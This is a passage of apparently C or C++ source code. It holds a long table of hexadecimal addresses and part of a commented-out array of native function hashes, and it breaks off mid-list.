0x1C267E0, 0x1C27318, 0x1C2B688, 0x1C24B18, 0x1C275B0, 0x1C25810, 0x1C25820, 0x1C28BC8, 0x1C298B8, 0x1C2B7F0, 0x1C24CD0, 0x1C24CD8, 0x1C2D3F0, 0x1C2E0E0, 0x1C2E140, 0x1C2E878, 0x1C2A070, 0x1C2A220, 0x1C2C7C8, 0x1C27000, 0x1C27220, 0x1C2A980, 0x1C2AA90, 0x1C2AFA0, 0x1C2B1F8, 0x1C2BAC0, 0x1C24028, 0x1C246D8, 0x1C25F50, 0x1C26150, 0x1C26678, 0x1C26DD0, 0x1C26F88, 0x1C28E68, 0x1C294A0, 0x1C29DA8, 0x1C24F00, 0x1C250D0, 0x1C2C120, 0x1C27500, 0x1C2AF90, 0x1C2BE10, 0x1C2DB00, 0x1C2A040, 0x1C2A130, 0x1C2C030, 0x1C257E8, 0x1C263C0, 0x1C26638, 0x1C271B8, 0x1C2A350, 0x1C2A8A8, 0x1C2AA28, 0x1C2ABB8, 0x1C250A8, 0x1C27610, 0x1C2C4A8, 0x1C2C6D8, 0x1C25598, 0x1C28AA0, 0x1C28B20, 0x1C29370, 0x1C29E50, 0x1C2AED8, 0x1C2B1C0, 0x1C2DA60, 0x1C2DFD0, 0x1C2E370, 0x1C2E648, 0x1C2A1B0, 0x1C4E148, 0x1C23D48, 0x1C242C0, 0x1C24480, 0x1C270A8, 0x1C2AB18, 0x1C2ADA8, 0x1C29150, 0x1C293B8, 0x1C29598, 0x1C29D20, 0x1C27558, 0x1C2D288, 0x1C2D2B8, 0x1C2E650, 0x1C2E820, 0x1C2A058, 0x1C2CA90, 0x1C255F0, 0x1C244F8, 0x1C24628, 0x1C25D60, 0x1C27110, 0x1C2AC50, 0x1C2B038, 0x1C2D148, 0x1C28B78, 0x1C29900, 0x1C2C1F8, 0x1C2DE28, 0x1C2A160, 0x1C2C8F8, 0x1C2CB38, 0x1C2A4D0, 0x1C25470, 0x1C25700, 0x1C265B8, 0x1C266E0, 0x1C26758, 0x1C270B8, 0x1C2AB08, 0x1C2D1D0, 0x1C2D5D0, 0x1C4E0E0, 0x1C23998, 0x1C23C98, 0x1C244A0, 0x1C24530, 0x1C25C58, 0x1C26520, 0x1C2C258, 0x1C2C348, 0x1C27588, 0x1C2D1B8, 0x1C2E080, 0x1C2E5B8, 0x1C2A1C8, 0x1C29878, 0x1C26BD8, 0x1C24DA8, 0x1C23AC8, 0x1C24450, 0x1C25F78, 0x1C26020, 0x1C27140, 0x1C2B290, 0x1C2BC00, 0x1C26B30, 0x1C2C358, 0x1C2E740, 0x1C25778, 0x1C248A0, 0x1C28DB0, 0x1C29888, 0x1C29D48, 0x1C29D98, 0x1C2ADA0, 0x1C2B448, 0x1C2D1A0, 0x1C2D390, 0x1C2D398, 0x1C2D5F8, 0x1C2D808, 0x1C240A0, 0x1C242C8, 0x1C264D0, 0x1C26830, 0x1C2A3C8, 0x1C2A7D8, 0x1C2AAB8, 0x1C28F90, 0x1C29068, 0x1C26BF8, 0x1C24C00, 0x1C2DC18, 0x1C2E0A0, 0x1C2E728, 0x1C2A1B8, 0x1C2C588, 0x1C2C850, 0x1C28E78, 0x1C244B0, 0x1C268B0, 0x1C26E90, 0x1C2ADC0, 0x1C2BC60, 0x1C2BEF0, 0x1C2D348, 0x1C27528, 0x1C2D590, 0x1C2DA08, 0x1C2E5D0, 0x1C25950, 0x1C25AD0, 0x1C24868, 0x1C27478, 0x1C23F40, 0x1C23FC0, 0x1C24010, 0x1C26C30, 0x1C2A978, 0x1C2AFE8, 0x1C2BAA0, 0x1C29808, 0x1C29C78, 0x1C2CBC8, 0x1C24EE8, 0x1C25160, 0x1C27680, 0x1C2D480, 0x1C2D4C0, 0x1C2E7A8, 0x1C2EAA0, 0x1C257B8, 0x1C25828, 0x1C247E0, 0x1C4E158, 0x1C23AD8, 0x1C24190, 0x1C26288, 0x1C26D50, 0x1C2BB78, 0x1C2D020, 0x1C296D8, 0x1C26BC8, 0x1C2C308, 0x1C24C68, 0x1C2A450, 0x1C2A4E8, 0x1C2A568, 0x1C25300, 0x1C259A8, 0x1C29340, 0x1C293A8, 0x1C23C38, 0x1C2D360, 0x1C2E318, 0x1C2E6B0, 0x1C2A0B8, 0x1C2A228, 0x1C2C5E8, 0x1C29DF0, 0x1C275C0, 0x1C2E440, 0x1C2C9C0, 0x1C25348, 0x1C25AB8, 0x1C25B08, 0x1C29328, 0x1C29708, 0x1C2BE00, 0x1C2D298, 0x1C2D800, 0x1C2DA50, 0x1C2DE50, 0x1C2E0E8, 0x1C2E3D8, 0x1C25F58, 0x1C26938, 0x1C272E8, 0x1C2AAA0, 0x1C2ACF8, 0x1C2AF38, 0x1C2B2B8, 0x1C24D90, 0x1C24E18, 0x1C24A60, 0x1C2D070, 0x1C2D748, 0x1C2D798, 0x1C2DFC8, 0x1C2C748, 0x1C2A468, 0x1C29318, 0x1C23F10, 0x1C23F58, 0x1C23F90, 0x1C24068, 0x1C25E40, 0x1C272F0, 0x1C2AE90, 0x1C29600, 0x1C24ED8, 0x1C2E448, 0x1C2A218, 0x1C25390, 0x1C28D30, 0x1C28FE0, 0x1C29170, 0x1C292C0, 0x1C26490, 0x1C26DD8, 0x1C273D0, 0x1C2A7C0, 0x1C2B0B8, 0x1C2B990, 0x1C2D8C8, 0x1C29BC8, 0x1C2B780, 0x1C2E8E8, 0x1C2C648, 0x1C2A5B8, 0x1C25560, 0x1C259D8, 0x1C29460, 0x1C29A48, 0x1C2A618, 0x1C2A878, 0x1C2AB78, 0x1C2AF10, 0x1C2BBA8, 0x1C2D130, 0x1C2D338, 0x1C23DE0, 0x1C24180, 0x1C243B0, 0x1C25EE8, 0x1C26430, 0x1C26818, 0x1C27180, 0x1C25510, 0x1C25638, 0x1C258F8, 0x1C28F78, 0x1C29738, 0x1C26A88, 0x1C2D730, 0x1C2DAC0, 0x1C2E358, 0x1C2A478, 0x1C2EBE0, 0x1C25288, 0x1C25438, 0x1C23C00, 0x1C25C78, 0x1C265E8, 0x1C26978, 0x1C2D188, 0x1C2D270, 0x1C2D440, 0x1C25B98, 0x1C247F0, 0x1C2C158, 0x1C27488, 0x1C2B2D0, 0x1C2BC48, 0x1C2BC58, 0x1C2D518, 0x1C25380, 0x1C25660, 0x1C256A8, 0x1C23D00, 0x1C242E0, 0x1C260F8, 0x1C26388, 0x1C269A8, 0x1C26FB0, 0x1C2A760, 0x1C2BAE8, 0x1C2DF68, 0x1C2C690, 0x1C2CA08, 0x1C2EA18, 0x1C29C30, 0x1C24160, 0x1C24248, 0x1C244C8, 0x1C26E48, 0x1C26F98, 0x1C2B520, 0x1C2B6C0, 0x1C25770, 0x1C25930, 0x1C247D0, 0x1C2E0B8, 0x1C2E0F0, 0x1C2E910, 0x1C2C3E8, 0x1C2C868, 0x1C2CA10, 0x1C25670, 0x1C2B720, 0x1C2B8B0, 0x1C2BAB0, 0x1C2D840, 0x1C2D940, 0x1C2D9A0, 0x1C2E018, 0x1C23EC0, 0x1C25CB8, 0x1C25D08, 0x1C25E70, 0x1C27028, 0x1C2A7B0, 0x1C2AF98, 0x1C25258, 0x1C28FD8, 0x1C29480, 0x1C296F8, 0x1C297E8, 0x1C29830, 0x1C2BC28, 0x1C2BC98, 0x1C2DFF8, 0x1C2C528, 0x1C2C608, 0x1C2C628, 0x1C2C730, 0x1C23A58, 0x1C23A68, 0x1C23BF8, 0x1C23E80, 0x1C260E8, 0x1C273F8, 0x1C2B110, 0x1C2C9A0, 0x1C2CA48, 0x1C2EC28, 0x1C292B8, 0x1C24A58, 0x1C276E0, 0x1C2B5B8, 0x1C2B678, 0x1C2B980, 0x1C2BC18, 0x1C2D028, 0x1C2C368, 0x1C2C668, 0x1C23BB8, 0x1C26180, 0x1C26478, 0x1C26958, 0x1C2A3E0, 0x1C2AF88, 0x1C2B418, 0x1C27620, 0x1C2E300, 0x1C2E658, 0x1C2C538, 0x1C2C7E0, 0x1C28F60, 0x1C26AB8, 0x1C27790, 0x1C264D8, 0x1C2B458, 0x1C2B8E8, 0x1C2B940, 0x1C2D3C0, 0x1C2DD88, 0x1C2DEF8, 0x1C23D30, 0x1C24178, 0x1C242D8, 0x1C24708, 0x1C25CA0, 0x1C25FA8, 0x1C26100, 0x1C24C40, 0x1C2C9C8, 0x1C25C08, 0x1C24838, 0x1C29300, 0x1C294C0, 0x1C29950, 0x1C2B798, 0x1C2A908, 0x1C2AFB8, 0x1C2B178, 0x1C2BCF0, 0x1C2D640, 0x1C2D750, 0x1C2E390, 0x1C24200, 0x1C24290, 0x1C25E48, 0x1C26540, 0x1C26598, 0x1C265D8, 0x1C27098, 0x1C28E80, 0x1C240C0, 0x1C24A00, 0x1C2B0E0, 0x1C2D998, 0x1C2DC98, 0x1C2E2E8, 0x1C2A270, 0x1C2C5B8, 0x1C28BD8, 0x1C23E20, 0x1C24228, 0x1C263E0, 0x1C269B0, 0x1C26C48, 0x1C270C0, 0x1C270C8, 0x1C29840, 0x1C2E978, 0x1C24D70, 0x1C2AB50, 0x1C2ABC0, 0x1C2B638, 0x1C2BF00, 0x1C2D728, 0x1C2C860, 0x1C28E48, 0x1C4E168, 0x1C239B8, 0x1C23A38, 0x1C23B08, 0x1C245F0, 0x1C25D10, 0x1C26668, 0x1C24D28, 0x1C25090, 0x1C2C0D0, 0x1C2D190, 0x1C2E4E0, 0x1C2E640, 0x1C2CA40, 0x1C2EC50, 0x1C28E30, 0x1C24CA0, 0x1C26200, 0x1C265C0, 0x1C26880, 0x1C27358, 0x1C2A400, 0x1C2A670, 0x1C2AE80, 0x1C2D110, 0x1C2D278, 0x1C2EAD8, 0x1C28FE8, 0x1C295F8, 0x1C24EA8, 0x1C2C2D8, 0x1C27008, 0x1C2A7E8, 0x1C2B190, 0x1C2B510, 0x1C2BA50, 0x1C2BEA8, 0x1C2D040, 0x1C23B00, 0x1C23B30, 0x1C24390, 0x1C243D8, 0x1C25DD0, 0x1C26160, 0x1C26680, 0x1C2C820, 0x1C25BC0, 0x1C28E10, 0x1C2E9C0, 0x1C269A0, 0x1C2AEA0, 0x1C2AF68, 0x1C2E1A0, 0x1C2E260, 0x1C2E830, 0x1C2C3F0, 0x1C29628, 0x1C24988, 0x1C24AC0, 0x1C2C0E8, 0x1C24B68, 0x1C274D0, 0x1C27660, 0x1C2D600, 0x1C2DBB8, 0x1C2DF88, 0x1C2C890, 0x1C28AB8, 0x1C28C08, 0x1C28E70, 0x1C24380, 0x1C2B378, 0x1C2BBF8, 0x1C2BDE8, 0x1C2BE40, 0x1C2D0D8, 0x1C2D5E8, 0x1C28E00, 0x1C28FB8, 0x1C296B8, 0x1C29E48, 0x1C2E4A8, 0x1C2E5E8, 0x1C2A2A8, 0x1C2C5C0, 0x1C2CAA8, 0x1C28CE0, 0x1C28D98, 0x1C24098, 0x1C26458, 0x1C26FE0, 0x1C2B540, 0x1C2D5F0, 0x1C2DD28, 0x1C2DEE8, 0x1C250C8, 0x1C2B978, 0x1C2C6E8, 0x1C25BF0, 0x1C29920, 0x1C29A98, 0x1C29C68, 0x1C2B830, 0x1C23A80, 0x1C23BA8, 0x1C26220, 0x1C263E8, 0x1C26EF8, 0x1C2A648, 0x1C2B320, 0x1C29710, 0x1C24E30, 0x1C24948, 0x1C24978, 0x1C2AB88, 0x1C2ACF0, 0x1C2B3C8, 0x1C2B588, 0x1C2DD68, 0x1C2A250, 0x1C2C560, 0x1C26278, 0x1C26568, 0x1C268D0, 0x1C26950, 0x1C27148, 0x1C2A960, 0x1C2AA00 };
	//static unsigned int allNativesHashes[] = { 0x3D87600, 0xD99EC000, 0x4F4BB300, 0xAB969F00, 0xA5B33300, 0x1F2F7D00, 0xBB293400, 0xC7C82800, 0x3FBC5D00, 0x7F349900, 0x72C20700, 0xD3C05B00, 0xFFF1B500, 0x81043F00, 0x31002201, 0x66FEB701, 0x9BEC3401, 0x19EC0001, 0xEB9EB001, 0xBE800B01, 0x11427401, 0x145C7701, 0x6F1A1901, 0xF9D7A401, 0x5231F901, 0x77B8EF01, 0x91C80401, 0xDB18FA01, 0xEDAE6C02, 0x9B9FCD02, 0x41A0FB02, 0xBC4AA502, 0x7F3F1C02, 0xEDF02302, 0xC2EE9A02, 0xB0237302, 0x9E553002, 0x48D84A02, 0x46617502, 0x6B125A02, 0x72BDE002, 0xED97B202, 0xFBB85E02, 0xC47DFF02, 0x96491602, 0xDAF42B02, 0x56A02502, 0xBEDC4503, 0x22C33603, 0xE4FF7103, 0xD6685803, 0xC1B92003, 0x9A025503, 0x196BA503, 0xEAA51103, 0x4E21B03, 0x26864403, 0x54EC103, 0x63CB4603, 0xEA9CA03, 0x74D42C03, 0x57216D03, 0xD6D70803, 0xDB817403, 0x7C496803, 0xB4737F03, 0xA4B4DB03, 0x2C842D03, 0x6926AB03, 0x4C0D5303, 0xBBC35B03, 0xC0718904, 0x242C6A04, 0x87D79A04, 0x5829E504, 0x603FA104, 0x4479B304, 0x8FF45B04, 0xE0160504, 0xB48C0C04, 0x9873E404, 0x3595B104, 0xF6AA0E04, 0x847F1304, 0xEC2E5304, 0x8EC68304, 0x32E9BE04, 0x85C98304, 0x2C653904, 0x71C12904, 0x65E1D404, 0x51972B04, 0x4F3E3104, 0x500B6805, 0x73AE5505, 0x725C7205, 0xA79E5B05, 0x2F98B405, 0x5F5A2605, 0x6EB92D05, 0x89D01805, 0x33951005, 0xAD8DA205, 0x7DA12905, 0x373CC405, 0x96525B06, 0xB19B4706, 0xD749B606, 0xEC2AAF06, 0x7AA36406, 0x902B4F06, 0xAD43306, 0x9C59FC06, 0xBE1C1506, 0xF4F13B06, 0x8B4D1C06, 0x4072CD06, 0x23E3F106, 0x66C32306, 0xDCE05406, 0xDBBCA06, 0x43103006, 0x4483EF06, 0x2A4E6706, 0x965EA007, 0x11718507, 0xAB415C07, 0x78436D07, 0x24857907, 0xB456D707, 0x2386A307, 0x5E557307, 0x82D32D07, 0xD14D9C07, 0x99F58A07, 0x38E42D07, 0xD909C107, 0x33B0B007, 0xBA2CF407, 0xC9FA6E07, 0xEF05F807, 0x276A7807, 0x4C3C2508, 0x83794008, 0x744AC008, 0x17CBC608, 0x1856D008, 0x371BBA08, 0xB6BCC608, 0xF3A3AB08, 0xE0B32108, 0x580D5508, 0x6B553408, 0x805BAB08, 0x35721A08, 0xDBD88708, 0x83ED8E08, 0xF49D8A08, 0x96B2FD08, 0x62A93608, 0xCDDF1508, 0x697FC008, 0x81049608, 0x33A9408, 0x58E67409, 0x18227209, 0xCAFE9209, 0xA2201E09, 0x432B0509, 0x54856309, 0xA3419909, 0x6719C109, 0x8CDB0C09, 0x9DB5D209, 0xB6DF3709, 0xD633C809, 0x88B9B909, 0xC84BE309, 0xABADB709, 0x99861609, 0x170DA109, 0x80C2AB09, 0xDEF31B0A, 0x2B240E0A, 0x30B3EC0A, 0x6776720A, 0x74E0BC0A, 0x9262A60A, 0x44A58B0A, 0x21645D0A, 0x3990C90A, 0x4559460A, 0xBC1E3D0A, 0xDD75460A, 0xE625510A, 0x4778CA0A, 0xB7E0F0A, 0xB370270A, 0x8A256D0A, 0x4ED1400A, 0x5DE98F0A, 0x18E3360A, 0x7E3AA40A, 0x4E9CA30A, 0x89459F0A, 0xC0A8590A, 0xCC90110B, 0xE3938B0B, 0x8AB4890B, 0x2FF65C0B, 0xA003C40B, 0xE0E2640B, 0xAF6F6E0B, 0xA819680B, 0x5533F60B, 0x2AB3670B, 0xF178390B, 0x8F95A20B, 0x4E0A260B, 0x784D550B, 0x13777A0B, 0x63F66A0B, 0xA068C40B, 0xE319F90B, 0x6E00EB0B, 0x761BE00B, 0xAA4AE00C, 0x4301E10C, 0x6087C10C, 0x8332730C, 0x66FA450C, 0x8DD9AA0C, 0xBDBC410C, 0x4A65250C, 0xEB69FB0C, 0x4ACF110C, 0x330A9C0C, 0xD24B4D0C, 0x1E8E310C, 0x44E1680C, 0x7DD7900C, 0x830AD50C, 0x6D7CF40C, 0xCC40D20D, 0x95F1C60D, 0xE69E8D0D, 0x49A11F0D, 0x8CEBA60D, 0x6B8E990D, 0x61F7650D, 0xF0BD420D, 0x5868D20D, 0x3612110D, 0x412AA00D, 0x596B900D, 0x9C8F830D, 0x9CFBE10D, 0x2276DE0D, 0x89365F0D, 0x456DB50D, 0x563E0D, 0x7A05BF0D, 0x7643170D, 0xB59B530D, 0x3648960D, 0x80BC530D, 0xB6D610D, 0x89499A0D, 0x84FA790D, 0x8262C70E, 0x8FA6EE0E, 0x8D27280E, 0x7A21050E, 0xA4D1B30E, 0x92452C0E, 0x41F5F10E, 0x7E5BC0E, 0x27F25C0E, 0xE3318E0E, 0xA1008E0E, 0xF3E7730E, 0x9F27D00E, 0xA1A1890E, 0x3F166D0E, 0x2A60A90E, 0x3554AA0E, 0x812CBE0E, 0xC6F43D0E, 0x39ABB10E, 0xDA0AF00E, 0x5D1F9E0F, 0xFE903D0F, 0xADD0B40F, 0xE46AC10F, 0x5518C0F, 0x6716460F, 0x1FDB590F, 0xABF3130F, 0x8E71E00F, 0xB270E0F, 0xF7A0F00F, 0xE9D9B70F, 0x897A510F, 0x82EEAF0F, 0x20EABD0F, 0x579B4510, 0x73E96210, 0xD87CC710, 0x4377C10, 0xE5219410, 0x25924010, 0xC1487110, 0x993DBC10, 0x48C80210, 0xF592AD10, 0x4C39CF10, 0xE1013910, 0x2832C010, 0xA54B0B10, 0x1D368510, 0x2576F610, 0xB245FC10, 0xE8D3A910, 0x68DCAE10, 0xBACF010, 0x8E114B10, 0x21B48F10, 0x7917E111, 0x307E7611, 0x87BD1D11, 0xA9021211, 0xD095F811, 0xCE7A2411, 0x567B0E11, 0x98BDB311, 0xE5961511, 0x5CE60A11, 0xCEE79711, 0x30510511, 0xDD524A11, 0xE2A11511, 0x8D5DF611, 0xF4418611, 0x2FC10D11, 0x4D9FBD11, 0xEAD0C412, 0x8E952B12, 0x4C2C2B12, 0x231CFD12, 0x4AD23212, 0xB9A3512, 0xC8A4BF12, 0xC65FC712, 0xCCF54912, 0x6632BC12, 0x81DAC12, 0x87A42A12, 0xFCBDA612, 0x2CDA5012, 0x76E96212, 0xBF80B412, 0x47436C12, 0xD2688412, 0x8A251612, 0xF1967A12, 0x1E54DB12, 0xBEE23713, 0xF8A07513, 0xADAF3513, 0x7A299C13, 0x2180AE13, 0x4B4B9A13, 0x13AFC13, 0x55226C13, 0x1F6B4B13, 0x9BA19C13, 0x48A18913, 0x4E418E13, 0xA27A9413, 0x80461113, 0x19266913, 0x8EACBD13, 0x96CD0513, 0x1DD55F13, 0x24D78013, 0x3F4AFB13, 0x53A95E13, 0x82697713, 0xE038813, 0x49FAE914, 0xC670C814, 0x26F6AF14, 0xF30E5814, 0xA51DC214, 0xF2F67014, 0x4908A514, 0x2D947814, 0x5C644614, 0x47CAB814, 0xE4EF6514, 0x4A46E814, 0x69880D14, 0xB2C33714, 0x47352E14, 0x72BA8A14, 0xF1F51A14, 0x9CD18314, 0x199DED14, 0x42A55B14, 0xA8546914, 0x72CF2514, 0x83BAE814, 0x3968E915, 0x2056A015, 0xB8BECF15, 0xA83C3D15, 0xBAF17315, 0x7C00B415, 0x9C49CC15, 0x75280015, 0xA286F015, 0x280DC015, 0x72B36815, 0xD368BA15, 0x23B02F15, 0xC0047F15, 0x8DE82C15, 0x2F3A0D15, 0xDA02F415, 0xB477A015, 0x8023B16, 0x59127716, 0x4BB33316, 0x7591E516, 0x405ECA16, 0x1393D16, 0xB837C816, 0x12AC1A16, 0xEF2A6016, 0x7D1A0616, 0x5B4FDC16, 0x9BC64E16, 0x3D2C1916, 0xACADF916, 0x19198A16, 0x3B321816, 0x8A3A3116, 0xC1DAE216, 0x849F0716, 0xB8209F16, 0xEC5D0317, 0x43657B17, 0xD3498917, 0xAE4E17, 0x2DE69817, 0x106C8317, 0x1560B017, 0x4A557117, 0x920C2517, 0xA2826D17, 0x67B23E17, 0xC4110917, 0x86E80A17, 0xA44CE817, 0x33C83F17, 0xE6587517, 0xCAD8217, 0xA2FA2C17, 0xA6BB5717, 0x81594917, 0xC5D94017, 0x6674818, 0xAC020C18, 0xEBC7B918, 0xCFCDC518, 0x433A9D18, 0xDAB86A18, 0xAB5B7C18, 0x8BC9E618, 0xF11A3018, 0x40282018, 0x3A11D118, 0xDF099E18, 0x14413319, 0xEE4B1219, 0xA5F89919, 0x7565FB19, 0x8AC9EA19, 0x44BFB619, 0xE84ABC19, 0x32094719, 0xAFE92319, 0xFB18CB19, 0x5CB76219, 0x1FDB2919, 0x991D6619, 0x4ED71C1A, 0x866DEF1A, 0xD156FD1A, 0xD10E761A, 0xBEB7281A, 0x6B189A1A, 0x2B31F41A, 0xD094F11A, 0x3DA41C1A, 0xE5612C1A, 0xBF90DF1A, 0x3129C31A, 0x2929F11A, 0xCDD4A61A, 0xE40A0F1A, 0xEBFCFF1A, 0xADB2511A, 0xAF59151A, 0x5038F1A, 0x1784BA1A, 0x8151571A, 0x8191BC1A, 0x914BC21A, 0x1DA7E41A, 0x6C67131A, 0xD8E31B1A, 0x54C44B1A, 0x5A45B11A, 0xCC9D7F1A, 0xAE1D101B, 0xDF70B41B, 0x6B0FE61B, 0xC174C71B, 0xAF3C081B, 0x517B601B, 0xFA60601B, 0xF390BA1B, 0x3BC8F1B, 0x7D927E1B, 0xF139681B, 0xDCBA251B, 0xBC54371B, 0xA170261B, 0xD1C3D71B, 0xB3496E1B, 0x5C3BF51B, 0xCD71F11B, 0xAE620A1B, 0xD79D5D1B, 0x2E51C61C, 0x4F5B781C, 0x2F0E171C, 0x877C0E1C, 0xF5E3401C, 0x92B7351C, 0x8A30761C, 0xFC50151C, 0x3D96A21C, 0xD87F3A1C, 0x2A2FBD1C, 0x534A5C1C, 0x6E7FDA1C, 0x6DEF6F1C, 0xD15C4B1C, 0xAEF9611C, 0x62A3161D, 0x7CF0971D, 0xF929F61D, 0x6574041D, 0x25740A1D, 0x64646F1D, 0x4FA5501D, 0x557EDA1D, 0x83A9811D, 0x8338DA1D, 0xA0DA6B1D, 0xB5DBF91D, 0xB507F51D, 0x328D601D, 0x64B70B1D, 0xF0E5C41D, 0xEC82A51D, 0x3033EA1D, 0x40BADA1D, 0x7F67671D, 0x67E28E1D, 0x46E7E31D, 0x9765E71D, 0x8C6E611D, 0xDFC5F71E, 0x5D66CE1E, 0x132CA01E, 0x2E96EF1E, 0xCB6A351E, 0x56E29A1E, 0x8BD5F11E, 0x710E5D1E, 0x4AC3421E, 0xF5F9B71E, 0x9AD1FE1E, 0x6D9BA11E, 0x5130DB1E, 0x3369DD1F, 0x3972551F, 0xD32FA11F, 0x4C2C0D1F, 0x718D461F, 0x4DA3D51F, 0xF9A401F, 0x8A13A41F, 0xF11D01F, 0x630101F, 0xD442521F, 0xBE92551F, 0xDE10BA1F, 0xC85DEF1F, 0x9620E41F, 0xDD4A3F1F, 0x93A44A1F, 0x8B52601F, 0x6214631F, 0xA86BD91F, 0xA7E36020, 0x64235620, 0x15607620, 0xABED6020, 0xC0E83320, 0x5D73CD20, 0x9C37F220, 0x7B689E20, 0xAFFEA720, 0xAF329720, 0x8E8CB520, 0x6E965420, 0x406B4B20, 0x7150720, 0x58040420, 0x253FD520, 0x22804C20, 0xCE7CB520, 0xC0B00C20, 0xE8E59820, 0x45B60520, 0xAB93F020, 0xD06F1720, 0xCE4A3D20, 0xC0823820, 0x45C82B21, 0xC1213A21, 0xDB718B21, 0x95F8A221, 0xA2E5F921, 0x4D8A6521, 0x7C92F21, 0xF3027D21, 0xD8CC7221, 0x89D5921, 0x9C35A221, 0x92E77D21, 0x98EFB921, 0xA5B55421, 0x9E61921, 0x7C278621, 0x478321, 0xABC99E21, 0x4F44AF21, 0xB1EF2E21, 0x6DCFC021, 0x76FB0F21, 0x39771F21, 0xF43D9821, 0x2A5DF721, 0x9ADD7B21, 0xAC290A21, 0xA2BE1821, 0x764F6222, 0x3FE5B222, 0x32A4EB22, 0xE4ECAC22, 0x54198922, 0x7DC6D022, 0xC3FD3822, 0x9E2B9522, 0x3B4EF322, 0xFF0F9B22, 0x56568422, 0xCCA9C022, 0x41B0D022, 0x144AAF22, 0x504C4B22, 0xE32FFB22, 0x90991122, 0x35614622, 0x88236E22, 0x5BBC5E23, 0x17A29F23, 0xE4302123, 0xEAF04923, 0x10F2C023, 0xB2477B23, 0xEB2A7B23, 0x8D014B23, 0xCE40F423, 0xB4668B23, 0x291C3B23, 0x9D8E1D23, 0xA4524B23, 0xDCA3F423, 0xB6E15B23, 0x22BE2423, 0xAC9BBA23, 0x5736FB23, 0x8A023024, 0x301A1D24, 0xFF62D324, 0xADF81D24, 0x137E3E24, 0xB02D6124, 0xCC7DCE24, 0x2632E124, 0x323B0E24, 0xC0EB6924, 0xCF2E3E24, 0x95C53824, 0xA280324, 0x495BE324, 0x65255524, 0xF8FBCC25, 0xEAB97F25, 0x19B27825, 0x67522E25, 0x53FD4A25, 0xD57A5125, 0xCA23FD25, 0x386F0D25, 0x5D209F25, 0x67E73525, 0xBC045625, 0x70DD5E25, 0xBA729A25, 0xD1B71A25, 0x37A28C26, 0xEE77C326, 0x1E3A3126, 0x2F38B526, 0x55C30B26, 0x8A559D26, 0xC3CDB626, 0xA18A1B26, 0x84315226, 0x50C39926, 0xAB73ED26, 0xFA92E226, 0x59DB8F26, 0xE8930226, 0xE399C26, 0x6B21FE26, 0x106BA127, 0x6BB93227, 0x331D9A27, 0x69956127, 0x798D6C27, 0x11DC0F27, 0x4DEBC227, 0x424C6E27, 0xA2FDAF27, 0xFC1CFC27, 0xAF25C027, 0x9FE60927, 0xEB7D7C27, 0x24F49427, 0x41A8A627, 0x67116627, 0x56F9ED27, 0x6878327, 0x31ABA127, 0x8F45D327, 0x8501E727, 0x63458C27, 0x43E92628, 0xA9565228, 0x8283E028, 0x2B2FCC28, 0xD2157428, 0xD9653728, 0x5AB94128, 0x4977AC28, 0x34DD7B28, 0x48CCC328, 0x5F6C3328, 0xA211A128, 0xB5F8BA28, 0x4DD03628, 0x12FA1C28, 0x288AD228, 0x55D41928, 0x8386AE28, 0x14AEAA28, 0x43996428, 0xDE40C28, 0xC9F67F28, 0xC2624A28, 0xA3589628, 0x53BB329, 0xE8C0C629, 0xD201FC29, 0x6BE5DF29, 0x7CE00B29, 0xFD66A429, 0x24DD4929, 0xF486429, 0xEC62629, 0xB2451429, 0x13301529, 0xE8EF929, 0x6C23D329, 0xA454DD29, 0x9FAB6729, 0x1D371529, 0xEA39A29, 0x3D026B29, 0xE796E629, 0x8DC53629, 0x9F75A929, 0x40C59829, 0x767DED29, 0x57218529, 0xA0C3CE29, 0x2678342A, 0x4E53202A, 0xA71A1D2A, 0xEBA00C2A, 0x9ECF722A, 0x41E8912A, 0x6A79782A, 0xFCFF792A, 0x9DF75B2A, 0x1490182A, 0x7C43D32A, 0xA739012A, 0x9CBA682A, 0xCBF91D2A, 0xBB2BA72A, 0xF6C7342A, 0xA65F262A, 0x1EFFB02A, 0x7FB6FB2A, 0x22CA9F2A, 0xFF06772A, 0x1572022A, 0xD59A822B, 0x9567392B, 0xA7F3F82B, 0xDBB83E2B, 0x9A703A2B, 0x5AB26C2B, 0x95A9AB2B, 0x28A3DD2B, 0x44F7D82B, 0xCEC2732B, 0x17146B2B, 0x8B99B72B, 0xC20A7D2B, 0x604C872B, 0xE9B97A2B, 0x3993092B, 0xFDAAEA2B, 0x543F712B, 0x38CC692B, 0xFD99BE2B, 0xF6E7E92B, 0xE7E1E32B, 0x1A81202B, 0xB26FED2B, 0xD209D52B, 0x3589452B, 0x6F1C592C, 0xBFC892C, 0xD19B312C, 0x5131CD2C, 0x7AAF22C, 0xA113B2C, 0x594E862C, 0x7E97C92C, 0x4BBE5E2C, 0x821F2D2C, 0x1582162C, 0x50779A2C, 0x655F072C, 0xD7E26B2C, 0xCE67162C, 0x4D46202C, 0x62BABF2C, 0x794CC92C, 0xC6CC812C, 0x8FF6232C, 0x893A342C, 0xAAD4012C, 0xFB4D062D, 0xE38E252D, 0x8592152D, 0xCCD8C02D, 0x2C30912D, 0x74EB662D, 0xD61D182D, 0xF7C6792D, 0x5BD8D82D, 0x883DAB2D, 0xE3F0D62D, 0x59CC312D, 0x89FF942D, 0xE20F2D, 0xAA10752D, 0x3C806A2D, 0x1A332D2D, 0x994B8C2D, 0xC249D62D, 0xC6EA802E, 0x6B74582E, 0x749B282E, 0xFDDB042E, 0x761CD02E, 0x94E42E2E, 0x758C5E2E, 0x47D98A2E, 0x32AFD42E, 0x6052E62E, 0xE85AEC2E, 0xA1A1402E, 0x4671AC2E, 0x1F38102E, 0xD2C80B2E, 0x6C17122E, 0x4D885B2E, 0x8DE5382F, 0xB8515B2F, 0xAB6BD72F, 0x20DDCF2F, 0x29F3572F, 0xED4A272F, 0xCBA7242F, 0xD3BBE42F, 0xB30B552F, 0xD0E0402F, 0x7BD5CF2F, 0x60E4C22F, 0xE5DCD62F, 0x71CDD52F, 0x4280F92F, 0x7090012F, 0x1094782F, 0x857DF02F, 0x6025AA2F, 0xC013972F, 0x5D38BD2F, 0x39D9102F, 0x1359292F, 0xB9FB142F, 0x4D76CD2F, 0xECA1512F, 0x4938C82F, 0x8C90D22F, 0xC753412F, 0x9356E92F, 0x7BFFE82F, 0xC51BC42F, 0xFD261E30, 0xC4769830, 0xD4B9730, 0xF6BDDA30, 0xDE524830, 0x6B90E730, 0xC7DE5C30, 0x5219D530, 0xE0A42430, 0x818B6830, 0xCD7F4030, 0x10D36630, 0x84930330, 0x68BA0730, 0x22A430, 0xA66CE30, 0xC1971F30, 0x29532731, 0xBD0D4831, 0xFBCD1831, 0x44767B31, 0x6A67FC31, 0x9497F31, 0x5865B031, 0x7FDF6131, 0x4C0E4031, 0xE2C45631, 